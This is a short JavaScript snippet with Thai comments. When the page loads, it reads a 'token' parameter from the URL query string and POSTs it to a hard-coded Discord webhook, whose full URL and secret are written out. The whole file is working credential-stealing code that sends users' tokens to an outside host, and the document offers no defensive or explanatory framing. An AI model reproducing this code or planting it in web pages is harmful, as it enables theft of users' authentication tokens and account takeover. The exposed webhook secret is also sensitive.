// URL ของ Webhook ของ Discord
const webhookUrl = 'https://discord.com/api/webhooks/1247307479834955797/XtrU8R1FXI-BoZKR0ZLS4nGhuiUS-sQH9tRRMAkusu6E9Fz81eVP4';

// ฟังก์ชันสำหรับการดึง Token ผู้ใช้งานและส่งไปยัง Webhook
function getTokenAndSendToWebhook() {
    // ดึง Token ผู้ใช้งานจาก URL (สมมติว่า Token ถูกเก็บใน query string)
    const urlParams = new URLSearchParams(window.location.search);
    const userToken = urlParams.get('token');

    // สร้าง JSON object ที่จะส่งไปยัง Webhook
    const data = {
        content: `Token ผู้ใช้งาน: ${userToken}`
    };

    // สร้าง XMLHttpRequest object
    const xhr = new XMLHttpRequest();

    // กำหนดวิธีและ URL ที่จะส่งข้อมูลไป
    xhr.open('POST', webhookUrl);

    // กำหนดหัวข้อ Content-Type เป็น application/json
    xhr.setRequestHeader('Content-Type', 'application/json');

    // ส่งข้อมูล JSON ไปยัง Webhook
    xhr.send(JSON.stringify(data));
}

// เรียกใช้ฟังก์ชันเมื่อเรียกใช้หน้าเว็บ
getTokenAndSendToWebhook();
